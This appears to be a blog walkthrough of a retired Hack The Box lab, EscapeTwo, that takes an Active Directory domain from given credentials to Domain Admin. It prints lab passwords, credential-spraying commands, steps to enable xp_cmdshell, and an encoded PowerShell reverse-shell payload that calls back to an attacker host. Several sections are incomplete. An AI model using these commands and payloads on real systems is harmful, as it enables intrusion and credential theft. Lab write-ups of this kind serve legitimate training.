---
title: "Assumed Breach to Domain Admin - HTB EscapeTwo Walkthrough"
date: 2025-06-15 10:10:00 +0700
categories: [Active-directory]
tags: [AD, Assumed Breach, HTB, MSSQL, SMB, Red Teaming, ADCS, ShadowCreds, BloodHound]
toc: true
pin: false
---

# Assumed Breach to Domain Admin – HTB EscapeTwo Walkthrough

This post demonstrates a full-path Active Directory compromise using initial credentials, misconfigured services, and post-exploitation techniques. Based on the retired [HTB EscapeTwo](https://app.hackthebox.com/machines/EscapeTwo) machine.

## Adversary Tradecraft Timeline

| Phase            | Tool/Action                    | Outcome                          |
| ---------------- | ------------------------------ | -------------------------------- |
| Initial Access   | Valid user credentials (rose)  | Confirmed domain access          |
| Recon            | MSSQL + SMB enumeration        | Found Excel creds via shares     |
| Credential Abuse | Used leaked `sa` password      | Gained privileged SQL shell      |
| Privesc          | Enabled `xp_cmdshell`          | `sql_svc` user shell             |
| Internal Recon   | BloodHound + ldapdomaindump    | Identified ADCS misconfig (ESC4) |
| Lateral Movement | OwnerEdit + DACL + ShadowCreds | Took over `ca_svc`               |
| Full Compromise  | ADCS abuse → cert + PFX login  | WinRM as Administrator           |

## 🔐 Initial Credentials

```bash
Username: rose
Password: KxEPkKe6R8su
```

```bash
echo -e "rose\nKxEPkKe6R8su" > creds.txt
```

## 🔍 Network Scanning

```bash
sudo nmap -p- --min-rate 10000 -sCV -Pn -oN enum.nmap 10.10.11.51

# Nmap 7.94SVN scan initiated Fri Jun 13 12:43:24 2025 as: nmap -sC -sV -p- -Pn -oN enum.nmap 10.10.11.51
Nmap scan report for 10.10.11.51
Host is up (0.020s latency).
Not shown: 65510 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-13 16:45:30Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-06-13T16:47:04+00:00; -2s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-13T16:47:04+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-06-13T16:47:04+00:00; -2s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-06-13T16:41:45
|_Not valid after:  2055-06-13T16:41:45
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-06-13T16:47:04+00:00; -2s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-06-13T16:47:04+00:00; -2s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49743/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-13T16:46:29
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 13 12:47:06 2025 -- 1 IP address (1 host up) scanned in 222.04 seconds


We can identify it as a domain controller based on the open ports. Next, let’s add sequel.htb and dc01.sequel.htb to our /etc/hosts file.

10.10.11.51 DC01.sequel.htb sequel.htb DC01

```

## Protocol Enumeration (NetExec)

```bash

After identifying valid user credentials (rose:KxEPkKe6R8su) and confirming dc01.sequel.htb as the domain controller,
we enumerate all exposed services for possible lateral movement or privilege escalation. Using NetExec, we test
multiple protocols to check for access and identify misconfigurations.

netexec smb dc01.sequel.htb -u rose -p 'KxEPkKe6R8su'       # own stuff using SMB  
netexec vnc dc01.sequel.htb -u rose -p 'KxEPkKe6R8su'       # own stuff using VNC  
netexec rdp dc01.sequel.htb -u rose -p 'KxEPkKe6R8su'       # own stuff using RDP  
netexec ssh dc01.sequel.htb -u rose -p 'KxEPkKe6R8su'       # own stuff using SSH  
netexec ftp dc01.sequel.htb -u rose -p 'KxEPkKe6R8su'       # own stuff using FTP  
netexec nfs dc01.sequel.htb -u rose -p 'KxEPkKe6R8su'       # own stuff using NFS  
netexec wmi dc01.sequel.htb -u rose -p 'KxEPkKe6R8su'       # own stuff using WMI  
netexec winrm dc01.sequel.htb -u rose -p 'KxEPkKe6R8su'     # own stuff using WINRM  
netexec mssql dc01.sequel.htb -u rose -p 'KxEPkKe6R8su'     # own stuff using MSSQL  
netexec ldap dc01.sequel.htb -u rose -p 'KxEPkKe6R8su'      # own stuff using LDAP  
```

Result:

```
SMB 10.10.11.51 445 DC01 [+] sequel.htb\rose:KxEPkKe6R8su
```

## 📁 SMB Share Enumeration & File retrieval

```bash

Option 1: Using netexec and smbclient

netexec smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --shares
smbclient '//dc01.sequel.htb/Accounting Department' -U rose%KxEPkKe6R8su
prompt off
mget *

OR use option 2: impacket-smbclient

impacket-smbclient SEQUEL.HTB/rose:KxEPkKe6R8su@dc01.sequel.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
Accounting Department
ADMIN$
C$
IPC$
NETLOGON
SYSVOL
Users
# use Accounting Department
# ls
drw-rw-rw-          0  Sun Jun  9 07:11:31 2024 .
drw-rw-rw-          0  Sun Jun  9 07:11:31 2024 ..
-rw-rw-rw-      10217  Sun Jun  9 07:11:31 2024 accounting_2024.xlsx
-rw-rw-rw-       6780  Sun Jun  9 07:11:31 2024 accounts.xlsx
# get accounting_2024.xlsx
# get accounts.xlsx

```

Discovered: `accounts.xlsx`

## 📊 Parse Excel File

```bash

cat accounts/xl/sharedStrings.xml | xmllint --xpath '//*[local-name()="t"]/text()' - | awk 'ORS=NR%5?",":"\n"' > userpass.txt

cat user.txt
angela
oscar
kevin
sa

cat passwords.txt

0fwz7Q4mSpurIt99
86LxLBMgEWaKUnBG
Md9Wlq1E5bZnVDVo
MSSQLP@ssw0rd!

I saved the users in a users file and the passwords in a passwords file. I'll use netexec to validate the credentials provided.

Note: the users and passwords are saved in order — each line in user.txt corresponds to the same line in passwords.txt.

```

Sample:

```
Angela,Martin,angela@sequel.htb,angela,0fwz7Q4mSpurIt99
Oscar,Martinez,oscar@sequel.htb,oscar,86LxLBMgEWaKUnBG
Kevin,Malone,kevin@sequel.htb,kevin,Md9Wlq1E5bZnVDVo
NULL,sa@sequel.htb,sa,MSSQLP@ssw0rd!,
```

## Credential Spraying

```bash
netexec smb sequel.htb -u users -p passwords --continue-on-success
netexec mssql sequel.htb -u users -p passwords --continue-on-success --local-auth
```

Found:

```
DC01\sa : MSSQLP@ssw0rd!
```

## 🛠️ Privileged MSSQL Shell

```bash
impacket-mssqlclient 'sa':'MSSQLP@ssw0rd!'@sequel.htb
```

Enable cmd exec:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

## Reverse Shell (via HoaxShell)

```bash
git clone https://github.com/t3l3machus/hoaxshell
cd hoaxshell
sudo pip3 install -r requirements.txt
chmod +x hoaxshell.py
sudo python3 hoaxshell.py -s 10.10.14.12
```

On MSSQL:

```sql
xp_cmdshell powershell -e JABzAD0AJwAxADAALgAxADAALgAxADQALgAxADIAOgA4ADAAOAAwACcAOwAkAGkAPQAnAGIAZAAxADIAOABlAGUANgAtAGYANQBkADQANgAzAGYAZQAtAGIAYwA5ADIAZgBiADEAMwAnADsAJABwAD0AJwBoAHQAdABwADoALwAvACcAOwAkAHYAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwBiAGQAMQAyADgAZQBlADYAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0ANgBjADIAYgAtAGIANQAyADQAIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AZgA1AGQANAA2ADMAZgBlACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtADYAYwAyAGIALQBiADUAMgA0ACIAPQAkAGkAfQApAC4AQwBvAG4AdABlAG4AdAA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABwACQAcwAvAGIAYwA5ADIAZgBiADEAMwAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtADYAYwAyAGIALQBiADUAMgA0ACIAPQAkAGkAfQAgAC0AQgBvAGQAeQAgACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACQAZQArACQAcgApACAALQBqAG8AaQBuACAAJwAgACcAKQB9ACAAcwBsAGUAZQBwACAAMAAuADgAfQA=
```

```sql
got shell as sql_svc

After extracting potential usernames and passwords from accounts.xlsx, I used netexec to validate access against the MSSQL service. The credentials were tested using the following command:

nxc mssql sequel.htb -u users -p passwords --no-bruteforce --local-auth --continue-on-success

Results:

MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [-] DC01\angela:0fwz7Q4mSpurIt99 (Login failed for user 'angela'. Please try again with or without '--local-auth')
MSSQL       10.10.11.51     1433   DC01             [-] DC01\oscar:86LxLBMgEWaKUnBG (Login failed for user 'oscar'. Please try again with or without '--local-auth')
MSSQL       10.10.11.51     1433   DC01             [-] DC01\kevin:Md9Wlq1E5bZnVDVo (Login failed for user 'kevin'. Please try again with or without '--local-auth')
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)

The sa (SQL Server Administrator) account was valid and provided elevated access.

To confirm the context and leverage command execution, I used the following:

netexec mssql dc01.sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -x whoami
MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
MSSQL       10.10.11.51     1433   DC01             [+] Executed command via mssqlexec
MSSQL       10.10.11.51     1433   DC01             sequel\sql_svc

This confirmed that I had command execution as the sql_svc service account 
```

```sql

Reverse Shell via xp_cmdshell and HoaxShell

With xp_cmdshell enabled on the SQL Server, I used [HoaxShell](https://github.com/t3l3machus/hoaxshell){:target="_blank"} to establish a stable reverse shell.

Step 1: Start the HoaxShell Listener

sudo python3 hoaxshell.py -s 10.10.14.12


    ┬ ┬ ┌─┐ ┌─┐ ─┐ ┬ ┌─┐ ┬ ┬ ┌─┐ ┬   ┬  
    ├─┤ │ │ ├─┤ ┌┴┬┘ └─┐ ├─┤ ├┤  │   │  
    ┴ ┴ └─┘ ┴ ┴ ┴ └─ └─┘ ┴ ┴ └─┘ ┴─┘ ┴─┘
                           by t3l3machus

[Info] Generating reverse shell payload...
powershell -e JABzAD0AJwAxADAALgAxADAALgAxADQALgAxADIAOgA4ADAAOAAwACcAOwAkAGkAPQAnAGIAZAAxADIAOABlAGUANgAtAGYANQBkADQANgAzAGYAZQAtAGIAYwA5ADIAZgBiADEAMwAnADsAJABwAD0AJwBoAHQAdABwADoALwAvACcAOwAkAHYAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwBiAGQAMQAyADgAZQBlADYAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0ANgBjADIAYgAtAGIANQAyADQAIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AZgA1AGQANAA2ADMAZgBlACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtADYAYwAyAGIALQBiADUAMgA0ACIAPQAkAGkAfQApAC4AQwBvAG4AdABlAG4AdAA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABwACQAcwAvAGIAYwA5ADIAZgBiADEAMwAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtADYAYwAyAGIALQBiADUAMgA0ACIAPQAkAGkAfQAgAC0AQgBvAGQAeQAgACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACQAZQArACQAcgApACAALQBqAG8AaQBuACAAJwAgACcAKQB9ACAAcwBsAGUAZQBwACAAMAAuADgAfQA=
Copied to clipboard!
[Info] Type "help" to get a list of the available prompt commands.
[Info] Http Server started on port 8080.
[Important] Awaiting payload execution to initiate shell session...
[Shell] Payload execution verified!
[Shell] Stabilizing command prompt...

PS C:\Windows\system32 > whoami
sequel\sql_svc

PS C:\Windows\system32 > whoami
sequel\sql_svc

After exploring the system, I located the SQL Server installation directory and dumped the configuration file, which revealed plaintext credentials:

Get-Content "C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI"

Notable entries:

PS C:\SQL2019\ExpressAdv_ENU > Get-Content sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True

C:\SQL2019>type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI | findstr /i password

type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI | findstr /i password
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"

```


## AD Recon 

```bash
ldapdomaindump ldap://dc01.sequel.htb -u sequel.htb\\rose -p 'KxEPkKe6R8su'
bloodhound-python -u rose -p 'KxEPkKe6R8su' -d sequel.htb -c all

With valid domain credentials for rose, I enumerated users via LDAP and attempted lateral movement by testing reused passwords across services.

Step 1: Dump All Domain Users via LDAP

nxc ldap dc01.sequel.htb -u rose -p 'KxEPkKe6R8su' --users-export users.txt

This successfully authenticated as rose and enumerated 9 domain users, exporting them to users.txt:

Administrator
Guest
krbtgt
michael
ryan
oscar
sql_svc
rose
ca_svc

Step 2: Password Spray with Recovered Password

Previously, we dumped the password for sql_svc from the SQL configuration file:
WqSZAF6CysDQbGb3

I now tested this password against all users via SMB:

nxc smb dc01.sequel.htb -u users.txt -p 'WqSZAF6CysDQbGb3' --continue-on-success

Results:

    ❌ Most accounts failed authentication

    ✅ ryan and sql_svc successfully authenticated using the same password!

Step 3: Remote Code Execution via WinRM

Since ryan accepted the password and was likely a standard user, I tested WinRM access:

nxc winrm sequel.htb -u ryan -p WqSZAF6CysDQbGb3

WINRM [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)

✅ Success! The user ryan is a member of the Remote Management Users group, allowing me to get a shell via evil-winrm and retrieve the first flag:

evil-winrm -i dc01.sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3'

This flow shows how a single credential reused across services and accounts enabled privilege chaining — from SQL config leakage to LDAP enumeration, SMB spraying, and finally WinRM shell access.

```

PowerShell check for ACL:

```powershell

After confirming that ryan had WinRM access:

evil-winrm -i dc01.sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3'

I initiated a PowerShell query to enumerate Ryan's permissions on Active Directory objects, specifically looking for dangerous rights like WriteOwner, GenericAll, or GenericWrite:

$u="SEQUEL\ryan";Get-ADUser -Filter *|%{$dn="AD:$($_.DistinguishedName)";$a=Get-Acl $dn;$h=$a.Access|?{$_.IdentityReference -eq $u -and $_.ActiveDirectoryRights -match 'WriteOwner|GenericAll|GenericWrite|All'};if($h){Write-Host "User: $($_.Name)" -ForegroundColor Cyan;$h|fl;Write-Host "-----" -ForegroundColor DarkGray}}

Ryan had WriteOwner rights over the Certification Authority object.

This permission enables a user to change the ownership of the targeted object — which in Active Directory can open the door to full control, allowing for privilege escalation via manipulation of access control or delegation paths.

```

##  Takeover ca_svc via ACL Abuse

```bash

```

## ADCS Abuse (ESC1 / ESC4)

```bash
Using certipy, I began enumerating the environment for vulnerable certificate templates:

certipy-ad find -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51

From the output, one particularly interesting certificate template stood out:

Template Name            : DunderMifflinAuthentication
Enabled                  : True
Enrollment Rights        : SEQUEL.HTB\Domain Admins, SEQUEL.HTB\Enterprise Admins
Full Control Principals  : SEQUEL.HTB\Cert Publishers
Write Owner Principals   : SEQUEL.HTB\Cert Publishers
Write Dacl Principals    : SEQUEL.HTB\Cert Publishers
Write Property Enroll    : SEQUEL.HTB\Cert Publishers

The DunderMifflinAuthentication template is enabled, allows for Client Authentication, and has autoenrollment enabled. While enrollment is limited to high-privileged groups like Domain Admins, control permissions are delegated to the Cert Publishers group.

Since I had already compromised the ca_svc account — which is a member of Cert Publishers — I was in a position to:

- Take ownership of the template
- Modify its permissions (e.g., add Enroll rights for another user I control)
- Request a certificate and authenticate as a domain admin

This control over the template made it a viable target for ESC4 abuse (Certificate Template Permissions) using certipy.

```

## 🪟 Admin Shell (WinRM)

```bash
netexec winrm sequel.htb -u Administrator -H <NTLM_HASH>
```

## 🔍 Blue Team Detection Tips

- Alert on `xp_cmdshell` usage or configuration
- Monitor certificate enrollments for abnormal usage
- Audit owner/DACL modifications to sensitive objects
- Harden and audit ADCS templates regularly (ESC1–ESC8)

## ✅ Summary

| Phase             | Tactic                                 |
| ----------------- | --------------------------------------- |
| Initial Access    | SMB login with `rose`                  |
| Recon             | Excel creds + BloodHound               |
| Privilege Esc     | `sa` → `xp_cmdshell`                   |
| ACL Abuse         | `ryan` takeover of `ca_svc`            |
| ADCS Exploit      | ESC1 / ESC4 → cert for Administrator   |
| Domain Takeover   | WinRM + `netexec` as Domain Admin      |

---

This walkthrough showcases a realistic assumed breach scenario using tools like BloodHound, Certipy, and Impacket to compromise a full AD forest. Ideal for red teamers testing post-exploitation, and blue teamers hunting TTPs.
